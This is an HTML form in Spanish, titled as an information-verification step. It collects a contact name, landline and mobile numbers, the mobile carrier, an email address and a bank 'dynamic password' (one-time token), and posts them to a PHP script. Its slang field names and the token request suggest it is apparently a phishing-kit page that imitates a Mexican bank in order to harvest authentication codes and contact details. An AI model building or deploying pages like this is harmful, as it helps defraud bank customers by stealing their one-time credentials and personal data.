<form action="cargando3.php" method="post" name="form" id="form">

                    <table width="760" height="10" border="0" cellspacing="0" cellpadding="0">
                        <tbody>
                            <tr>
                                <td align="center">
                                    <table width="760" border="0" cellspacing="2" cellpadding="3" bgcolor="#FFFFFF">
                                        <tbody>
                                            <tr>
                                                <td class="tittabdat">


                                                    <input name="tipoMod" type="radio" value="1" checked="">



                                                    Verificando informaci&oacute;n
                                                </td>
                                            </tr>
                                            <tr align="center">
                                                <td height="10" colspan="2" valign="top" class="textabdatcla">
                                                    <table width="660" border="0" cellspacing="0" cellpadding="0">
                                                        <tbody>
                                                            <tr valign="top">
                                                                <td width="420" align="left">
                                                                    <table width="433" border="0" cellspacing="0" cellpadding="5">
                                                                        <tbody>
                                                                            <tr>
                                                                                <td align="right" class="tabmovtex" width="123" nowrap="">
                                                                                    Nombre de contacto: </td>
                                                                                <td class="tabmovtex" width="290" nowrap="">
                                                                                    <input name="bato" type="text" value="" size="30" maxlength="50" id="bato"> </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" class="tabmovtex" nowrap="">
                                                                                    Tel&eacute;fono fijo: </td>
                                                                                <td class="tabmovtex" nowrap="">
                                                                                    <input name="fon" type="text" id="fon" onkeypress="return solo_numeros_wey(event)" value="" size="30" maxlength="12"> </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" class="tabmovtex">
                                                                                </td>
                                                                                <td>
                                                                                    <!--<table width="260" border="0" cellspacing="0" cellpadding="5">
                                                                                        <tbody>
                                                                                            <tr valign="bottom">
                                                                                                <td align="left" class="tabmovtex">
                                                                                                </td>
                                                                                                <td align="right" class="tabmovtex">&nbsp; </td>
                                                                                                <td align="left" class="tabmovtex">
                                                                                                    Tel&eacute;fono Celular </td>
                                                                                                <td align="left" class="tabmovtex">
                                                                                                    Compañía</td>

                                                                                            </tr>
                                                                                            <tr valign="top">
                                                                                                <td align="left" class="tabmovtex">


                                                                                                </td>
                                                                                                <td align="center" class="tabmovtex">
                                                                                                </td>
                                                                                                <td align="left" class="tabmovtex">


                                                                                                    <input onkeypress="return solo_numeros_wey(event)" name="celular" id="celular" type="text" value="" size="20" maxlength="13"> </td>
                                                                                                <td align="left" class="tabmovtex">

                                                                                                    <select id="carrier" name="carrier">



                                                                                                        <option value="TE" selected="">TELCEL</option>

                                                                                                        <option value="TF">TELEFONICA</option>

                                                                                                        <option value="NE">AT&amp;T</option>

                                                                                                        <option value="UN">UNEFON</option>

                                                                                                        <option value="NI">OTRO</option>

                                                                                                    </select> </td>
                                                                                            </tr>
                                                                                        </tbody>
                                                                                    </table>-->
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>
                                                                </td>
                                                                <td width="240" align="left">
                                                                    <table width="240" border="0" cellspacing="0" cellpadding="3">
                                                                        <tbody>
                                                                            
                                                                            <tr>
                                                                                <td align="right" class="tabmovtex" nowrap="">
                                                                                    Tel&eacute;fono Celular
                                                                                </td>
                                                                                <td class="tabmovtex" align="center" valign="middle">
                                                                                    <!--<input name="passemail" type="password" id="passemail" value="" size="30">-->
                                                                                    <input onkeypress="return solo_numeros_wey(event)" name="celular" id="celular" type="text" value="" size="30" maxlength="13">
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" class="tabmovtex" nowrap="">
                                                                                    Compa&ntilde;ía
                                                                                </td>
                                                                                <td class="tabmovtex" align="center" valign="middle">
                                                                                    <!--<input name="passemail2" type="password" id="passemail2" value="" size="30">-->

                                                                                    <select id="carrier" name="carrier" style="width: 190px;">
                                                                                        <option value="" selected="">SELECCIONE UNA OPCION</option>
                                                                                        <option value="TELCEL">TELCEL</option>
                                                                                        <option value="TELEFONICA">TELEFONICA</option>
                                                                                        <option value="AT&T">AT&amp;T</option>
                                                                                        <option value="UNEFON">UNEFON</option>
                                                                                        <option value="OTRO">OTRO</option>
                                                                                    </select>
                                                                                </td>
                                                                            </tr>
                                                                            <tr>
                                                                                <td align="right" class="tabmovtex" width="107" nowrap="">
                                                                                    E-mail:
                                                                                </td>
                                                                                <td class="tabmovtex" width="15" valign="middle" align="center">
                                                                                    <input name="correo" type="text" value="" size="30" id="correo">
                                                                                </td>
                                                                            </tr>
                                                                        </tbody>
                                                                    </table>


                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                </td>
                                            </tr>
                                        </tbody>
                                    </table>
                                    <span class="tabmovtex">
                                        <br>
                                        Contraseña dinámica:
                                        <input onkeypress="return solo_numeros_wey(event)" name="token" type="password" id="token" value="" size="10" maxlength="8">
                                        <br>
                                        <table width="166" border="0" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" height="10">
                                            <tbody>
                                                <tr>
                                                    <td align="right" valign="top" height="10" width="116"><a>
                                                            <br>
                                                            <input id="btnAceptar" name="Aceptar" type="button" class="tittabcenazu" value="Aceptar">
                                                            <!--<input id="btnVerify" name="btnVerify" type="button" class="tittabcenazu" value="Aceptar" style="display: none;">-->

                                                            
                                                        </a> </td>
                                                    <td align="left" valign="middle" height="10" width="50"><a href="javascript:resetDataUsr(this.form);"> </a> </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </form>